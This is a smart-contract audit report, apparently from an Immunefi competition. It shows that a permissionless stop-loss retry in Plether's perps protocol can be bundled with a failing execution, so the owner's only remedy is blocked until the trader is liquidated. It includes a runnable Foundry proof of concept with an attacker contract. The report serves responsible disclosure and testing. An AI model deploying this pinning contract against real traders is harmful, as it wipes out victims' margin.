# \#97789 [SC-High] MED-9 fix incomplete: permissionless retryPositionProtectionClose keeps the owner-only amend gate closed, so a failing stop-loss is pinned until the trader is liquidated (griefing)

**Submitted on Nov 3rd 2026 at 07:43:30 UTC by @fornex for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97789
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

Plether's stop-loss / take-profit protections give a trader exactly one way to recover after a protective close fails its own financial limits: the owner-only `amendLatchedPositionProtectionCloseLimits`, which works only while the protection is `Latched` with no pending order. The permissionless `retryPositionProtectionClose` can be called by anyone and, from that exact state, queues a new close attempt carrying the same failing limits, moving the protection to `Triggered` and closing the amend gate again. An attacker that bundles the failing `executeOrder` with `retryPositionProtectionClose` in one transaction ensures the trader never observes an amendable state, so the stop-loss can neither execute nor be repaired and the position runs to liquidation. This defeats the exact remediation Cecuro MED-9 relied on ("the owner amends them") and turns a capped stop-loss loss into a full-margin liquidation.

## Vulnerability Details

Commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`, Arbitrum, USDG. Contract: `packages/perps/src/PositionProtectionBook.sol`.

The MED-9 fix stores the trader's close limits on each protection and copies them into every trigger/retry attempt; its stated remedy for limits that turn out too tight is: "Only the owner may amend the retained ceilings while protection is Latched ... until conditions improve or the owner amends them."

That remedy is a single owner-only function, gated on two conditions:

`amendLatchedPositionProtectionCloseLimits` (PositionProtectionBook.sol:315-327)
- `_ownedActiveProtection(protectionId, msg.sender)`  // owner only
- requires `status == Latched`                         // :320-322
- requires `pendingOrderCounts(msg.sender) == 0`       // :323-325

The retry entrypoint coexisting with it is permissionless and inverts both conditions:

`retryPositionProtectionClose` (PositionProtectionBook.sol:382-405)
- `_activeProtection(protectionId)`            // :385 - ANY caller (not _ownedActiveProtection)
- requires `status == Latched`                 // :386-388
- requires `pendingOrderCounts(account) == 0`  // :392-394
- `commitProtectionCloseAttempt(...)`          // :399-401 - new attempt, SAME stored limits
- `_recordCloseAttempt(...)`                   // :405 - status -> Triggered, pending -> 1

So in the only state where the owner can amend (`Latched && pendingOrderCounts == 0`), anyone can move the protection out of that state with a fresh attempt carrying the same failing limits. Every other exit is closed while a protection is Triggered/Latched:
- `cancelPositionProtection` -> `_cancel` accepts only PendingOpen/Armed (:331-338, :408-419)
- `cancelPositionProtectionAndCommitClose` requires Armed (:341-348)
- `router.commitOrder` (including a manual close) reverts `OrderRouter__ProtectionActive` (router/OrderLiquidationBatchLogic.sol:313-315)
- liquidation is NOT gated by protection state (CfdEngine.sol:1010 liquidatePosition, OrderRouter.sol:493 executeLiquidation)

An attacker contract that executes the failing attempt (permissionless `router.executeOrder`; it fails and relatches) and calls `retryPositionProtectionClose` in the SAME transaction ensures `Latched && pending == 0` never exists in a block the trader can act in. The owner's amend always reverts `ProtectionNotLatched`.

This is not documented keeper behaviour: DEPLOYMENT.md:420-421 tells protection workers "do not continuously queue the same failing attempt." SECURITY.md:550 documents that retry is permissionless, but not that a pending retry removes the owner's only remedy.

## Attack Scenario

Sign convention: a LONG gains when the basket falls, so a LONG stop-loss sits ABOVE entry and the adverse move is the basket RISING.

1. ALICE opens LONG 10,000 units at 1.00 (2,000 USDG margin) and arms a stop-loss at 1.10 with `maxExecutionNotionalAssets = 11,100 USDG` (a reasonable cap just above the 11,000 USDG trigger notional).
2. The basket gaps to 1.12. The permissionless trigger queues the close; executing it fails `ConstraintViolation(ExecutionNotional)` and relatches. Without an attacker, ALICE amends and exits (control test).
3. The attacker's contract, in the first block each attempt is executable, calls `executeOrder(attempt)` (fails, relatches) + `retryPositionProtectionClose` (new attempt, same limits) atomically.
4. ALICE's amend reverts `ProtectionNotLatched`, cancel reverts `ProtectionNotArmed`, `commitOrder(close)` reverts `ProtectionActive`. She can only add margin.
5. The basket keeps rising; a keeper liquidates ALICE while she is pinned.

Live-market variant (no price gap, no weekend freeze): the close path charges VPI on pre/post skew (libraries/CloseAccountingLib.sol:104-118) bounded by `maxActionChargeAssets` (CfdOrderPolicyEvaluatorBase.sol:508-512), but unlike `planOpen` (libraries/CfdEnginePlanLib.sol:473-478, SKEW_TOO_HIGH) the close path has NO skew cap. A third party opens a large opposite-side SHORT; the victim's protective close becomes skew-increasing, its action charge exceeds the victim's ceiling, and every attempt fails `ConstraintViolation(ActionCharge)`.

## Impact Details

Measured from identical setUp and identical price path (PoC):
- Control (no attacker; owner amends, stop-loss exits at 1.12): victim loss = **1,208.68 USDG**
- Attack (pinned 1.12 -> 1.16 -> 1.20, then liquidated): victim loss = **2,000.20 USDG** (entire margin)
- Loss caused purely by the pin: **791.52 USDG (+65%)**

Live-market variant (production vpiFactor 0.01e18; victim LONG 100,000 units, 12,000 USDG margin): attacker net irrecoverable cost ~**400 USDG** vs the victim's extra ~**545 USDG** just to exit, and the full ~12,000 USDG margin if the pin is held to liquidation. Attacker base-case cost: one Arbitrum transaction per attempt, zero bounty, no capital. Damage per victim is hundreds to thousands of USDG, far above the 1:100 griefing threshold.

## Recommendation

Give the owner a remedy a third party cannot pre-empt: (a) extend the owner-only amend to accept `Triggered` when the live child is the registered attempt (settle it via the existing zero-record cleanup, relatch, apply new limits, optionally re-queue, atomically); or (b) let `cancelPositionProtectionAndCommitClose` run from Triggered/Latched. Do NOT simply make retry owner-only, since SECURITY.md relies on keepers retrying for liveness; if it must be restricted, restrict it only after `ConstraintViolation` failures and keep it permissionless after Expired / oracle-unavailable failures.

## Limitations (disclosed)

1. Sequencer race: the attacker must execute each failing attempt itself, bundled with the retry. A victim that executes the attempt first and lands amend in the next transaction escapes; a smart-account / EIP-7702 victim can bundle execute+amend+retry. On Arbitrum FCFS this is a per-attempt race (Timeboost's express lane favours the attacker but does not guarantee it).
2. Atomicity is required: a non-atomic attacker leaves a gap the victim can use (shown in the stress PoC).
3. The pin needs a binding limit and persistent failure; unlimited limits execute at the gap, and a price retrace breaks the pin.
4. `addMargin` stays available while pinned, so a victim with capital can delay liquidation but still cannot reduce or close the position.

## Known-issue disclosure

Cecuro MED-9 (Addressed): this report is on the same feature and shows the fix is incomplete — the owner-only amend it relies on can be withheld by the permissionless retry it coexists with. The program accepts same-root-cause reports on fixed findings only when they show the fix at commit a82d4fef is incomplete or introduces a new bug; this is that case, with a runnable PoC. It is distinct from MED-30 (frozen-market triggering; this works in live markets) and from the SCAN protection-bounty / position-matching items (bounty timing / matching, not owner-remedy availability).

## Link to Proof of Concept

https://gist.github.com/rajanpanth/a848f8a7267a5f0a43c5e50956c1290a

## Proof of Concept

## Proof of Concept

All PoC files inherit the project's own `test/perps/spec/trader/PositionProtection.t.sol` (the standard repo harness), drive only real entrypoints with mock Pyth payloads, and contain NO storage cheats (no vm.store / vm.etch / vm.mockCall / stdstore). No in-scope contract is modified. The headline PoC source is inlined in full below; the three supporting PoC files are referenced by name and are reproduced from the same harness.

### Setup (clean clone at the commit in scope)
```
git clone --recurse-submodules https://github.com/immunefi-team/audit-comp-plether.git
cd audit-comp-plether
git checkout --detach a82d4fefb02768e5b3bddcc97dee371eee24fea8
git submodule update --init --recursive
# Save the Solidity below as packages/perps/.audit-test/perps/poc/PROT1_Submission.t.sol
cd packages/perps
```

### Run (headline PoC)
```
FOUNDRY_OFFLINE=true FOUNDRY_TEST=.audit-test forge test --match-contract PROT1_SubmissionTest -vv
```
Expected: the 5 `test_PROT1_*` tests pass.
- `test_PROT1_control_ownerAmendsAndExits` — no attacker: the owner amends the latched limits and the stop-loss exits (the MED-9 remedy works).
- `test_PROT1_attacker_pinsOwnerOutOfEveryRemedy` — attacker pins each cycle; `amend` reverts ProtectionNotLatched, `cancel` reverts ProtectionNotArmed, `commitOrder(close)` reverts ProtectionActive; position stays fully open.
- `test_PROT1_liq_control_stopLossHonored` — CONTROL victim loss = 1,208.68 USDG (logged `1208680000`).
- `test_PROT1_liq_attack_pinnedThenLiquidated` — ATTACK victim loss = 2,000.20 USDG (logged `2000200000`), the entire margin.
- `test_PROT1_nonAtomicAttacker_ownerEscapes` — disclosed bound: a non-atomic attacker loses the race and the owner exits.

The two liquidation tests start from identical setUp, so the delta (791.52 USDG, +65%) is caused purely by the pin. The attached screenshots show these passing on a fresh clone, that `git status packages/perps/src` is empty (in-scope code unmodified), and that a grep finds no storage cheats are called.

### Supporting PoCs (per-scenario numbers, including the live-market variant PROT-1b)
Files (same harness, under `packages/perps/.audit-test/perps/poc/`): `PROT1_LatchedProtectionPinning.t.sol`, `PROT1_PinToLiquidation.t.sol`, `PROT1_SkewDrivenActionChargePin.t.sol`.
```
FOUNDRY_OFFLINE=true FOUNDRY_TEST=.audit-test forge test --match-path '.audit-test/perps/poc/PROT1*' --match-test 'test_PROT1|test_ChainD|test_LEAD3' -vv
```
Result: 8 passed, 0 failed. `test_LEAD3_attack_skewPinsVictim` logs the live-market variant (attacker net irrecoverable cost `400003298` ~= 400 USDG; victim action-charge to exit `5536740645`).

### Headline PoC source — PROT1_Submission.t.sol (runnable, no storage cheats)
```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

// PROT-1: permissionless retryPositionProtectionClose keeps the owner-only amend gate closed, so a stop-loss that
// fails its stored limits can be held unfixable and un-exitable until the position is liquidated.
// Inherits the project's own PositionProtectionTest base; real entrypoints only; mock Pyth payloads; no storage cheats.

import {PositionProtectionTest} from "../../../test/perps/spec/trader/PositionProtection.t.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";

interface ISubmissionExecRouter {
    function executeOrder(uint64 orderId, bytes[] calldata pythUpdateData)
        external
        payable
        returns (OrderV3Types.ExecutionResult memory);
}

/// @notice Attack primitive: in ONE tx, execute the victim's failing attempt (it relatches to Latched) and immediately
///         re-queue a fresh attempt with the SAME stored limits (status -> Triggered), so `Latched && pending == 0`
///         (the only amendable state) never exists in a block the victim can act in.
contract SubmissionPinner {
    function pin(address router, address book, uint64 attemptId, bytes[] calldata data, uint64 protectionId)
        external
        returns (uint64 nextAttempt)
    {
        OrderV3Types.ExecutionResult memory r = ISubmissionExecRouter(router).executeOrder(attemptId, data);
        require(r.status == OrderV3Types.LifecycleStatus.Failed, "attempt unexpectedly executed");
        nextAttempt = IPositionProtectionActions(book).retryPositionProtectionClose(protectionId);
    }
}

contract PROT1_SubmissionTest is PositionProtectionTest {
    uint256 internal constant SL_PRICE = 110_000_000; // 1.10 stop-loss trigger
    uint256 internal constant GAP_PRICE = 112_000_000; // 1.12 first adverse tick (SL fires)
    uint256 internal constant NOTIONAL_BOUND = 11_100e6; // reasonable cap just above the 11,000 USDG trigger notional

    function _armBoundedLong() internal returns (uint64 protectionId) {
        _open(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, MARK_PRICE);
        PositionProtectionTypes.PositionProtectionParams memory params = _params(0, SL_PRICE);
        params.closeLimits.maxExecutionNotionalAssets = NOTIONAL_BOUND;
        vm.prank(ALICE);
        protectionId = protectionActions.createPositionProtection(params);
    }

    function _aliceTotal() internal view returns (uint256) {
        return clearinghouse.balanceAssets(ALICE) + clearinghouse.lockedMarginAssets(ALICE);
    }

    function _status(uint64 pid) internal view returns (PositionProtectionTypes.PositionProtectionStatus) {
        return protectionViews.getPositionProtection(pid).status;
    }

    // CONTROL: no attacker. After the bounded close fails and relatches, the owner uses the MED-9 remedy and exits.
    function test_PROT1_control_ownerAmendsAndExits() public {
        uint64 pid = _armBoundedLong();
        uint64 attemptId = _triggerAt(pid, GAP_PRICE);
        bytes[] memory data = _mockPythUpdateData(GAP_PRICE);
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory r = router.executeOrder(attemptId, data);
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Failed), "bounded close fails on the gap");
        assertEq(uint8(_status(pid)), uint8(PositionProtectionTypes.PositionProtectionStatus.Latched), "relatched");
        vm.prank(ALICE);
        protectionActions.amendLatchedPositionProtectionCloseLimits(pid, _params(0, 0).closeLimits);
        vm.prank(ALICE);
        uint64 retry = protectionActions.retryPositionProtectionClose(pid);
        data = _mockPythUpdateData(GAP_PRICE);
        vm.prank(EXECUTION_KEEPER);
        r = router.executeOrder(retry, data);
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), "amended close exits");
        (uint256 size,,,,,,) = engine.positions(ALICE);
        assertEq(size, 0, "position closed by the stop-loss");
    }

    // ATTACK: a third party pins the protection; every owner remedy reverts every block while the basket runs.
    function test_PROT1_attacker_pinsOwnerOutOfEveryRemedy() public {
        uint64 pid = _armBoundedLong();
        uint64 attemptId = _triggerAt(pid, GAP_PRICE);
        SubmissionPinner pinner = new SubmissionPinner();
        PositionProtectionTypes.CloseFinancialLimits memory relaxed = _params(0, 0).closeLimits;
        uint256 price = GAP_PRICE;
        for (uint256 i; i < 6; ++i) {
            bytes[] memory data = _mockPythUpdateData(price);
            attemptId = pinner.pin(address(router), address(protectionBook), attemptId, data, pid);
            vm.startPrank(ALICE);
            vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
            protectionActions.amendLatchedPositionProtectionCloseLimits(pid, relaxed);
            vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
            protectionActions.cancelPositionProtection(pid);
            vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
            router.commitOrder(CfdTypes.Side.LONG, POSITION_SIZE, 0, 0, true);
            vm.stopPrank();
            price += 1_000_000; // basket +1% per cycle (adverse for the LONG)
        }
        (uint256 size,,,,,,) = engine.positions(ALICE);
        assertEq(size, POSITION_SIZE, "victim still fully exposed after 6 pin cycles");
        emit log_named_uint("victim still open at price (1e8)", price - 1_000_000);
        emit log_named_uint(
            "unrealized loss beyond the SL fill at 1.12 (USDG 1e6)",
            (price - 1_000_000 - GAP_PRICE) * POSITION_SIZE / 1e20
        );
    }

    // REALIZED LOSS, CONTROL: stop-loss relatches once, owner amends and exits near 1.12. Separate fn => fresh setUp.
    function test_PROT1_liq_control_stopLossHonored() public {
        uint256 start = _aliceTotal();
        uint64 pid = _armBoundedLong();
        uint64 attempt = _triggerAt(pid, GAP_PRICE);
        bytes[] memory data = _mockPythUpdateData(GAP_PRICE);
        vm.prank(EXECUTION_KEEPER);
        router.executeOrder(attempt, data);
        vm.prank(ALICE);
        protectionActions.amendLatchedPositionProtectionCloseLimits(pid, _params(0, 0).closeLimits);
        vm.prank(ALICE);
        uint64 retry = protectionActions.retryPositionProtectionClose(pid);
        data = _mockPythUpdateData(GAP_PRICE);
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory r = router.executeOrder(retry, data);
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), "control SL exits");
        (uint256 size,,,,,,) = engine.positions(ALICE);
        assertEq(size, 0, "closed at the stop-loss");
        emit log_named_uint("CONTROL victim loss, stop-loss honored (USDG 1e6)", start - _aliceTotal());
    }

    // REALIZED LOSS, ATTACK: pinned across the adverse move, then liquidated. Identical fresh setUp and price path.
    function test_PROT1_liq_attack_pinnedThenLiquidated() public {
        uint256 start = _aliceTotal();
        uint64 pid = _armBoundedLong();
        uint64 attempt = _triggerAt(pid, GAP_PRICE);
        SubmissionPinner pinner = new SubmissionPinner();
        uint256 price = GAP_PRICE;
        for (uint256 i; i < 2; ++i) {
            bytes[] memory d = _mockPythUpdateData(price);
            attempt = pinner.pin(address(router), address(protectionBook), attempt, d, pid);
            price += 4_000_000; // 1.12 -> 1.16 -> 1.20 while pinned
        }
        (uint256 sizePinned,,,,,,) = engine.positions(ALICE);
        assertEq(sizePinned, POSITION_SIZE, "still fully exposed while pinned");
        _mockPythUpdateData(price); // advance the clock so the liquidation basket is strictly newer than the mark
        bytes[] memory liqData = _livePriceData(price);
        vm.prank(EXECUTION_KEEPER);
        router.executeLiquidation(ALICE, liqData);
        (uint256 size,,,,,,) = engine.positions(ALICE);
        assertEq(size, 0, "liquidated while pinned");
        emit log_named_uint("ATTACK victim loss, pinned then liquidated (USDG 1e6)", start - _aliceTotal());
        emit log_named_uint("liquidation price reached while pinned (1e8)", price);
    }

    // BOUND (disclosed): the attacker must execute+retry atomically. A separate-tx attacker lets the owner escape.
    function test_PROT1_nonAtomicAttacker_ownerEscapes() public {
        uint64 pid = _armBoundedLong();
        uint64 attemptId = _triggerAt(pid, GAP_PRICE);
        bytes[] memory data = _mockPythUpdateData(GAP_PRICE);
        vm.prank(address(0xA77ACC));
        OrderV3Types.ExecutionResult memory r = router.executeOrder(attemptId, data);
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Failed), "attempt fails and relatches");
        vm.prank(ALICE);
        protectionActions.amendLatchedPositionProtectionCloseLimits(pid, _params(0, 0).closeLimits);
        vm.prank(ALICE);
        uint64 retry = protectionActions.retryPositionProtectionClose(pid);
        data = _mockPythUpdateData(GAP_PRICE);
        vm.prank(EXECUTION_KEEPER);
        r = router.executeOrder(retry, data);
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), "owner escapes a non-atomic attacker");
        (uint256 size,,,,,,) = engine.positions(ALICE);
        assertEq(size, 0);
    }
}
```
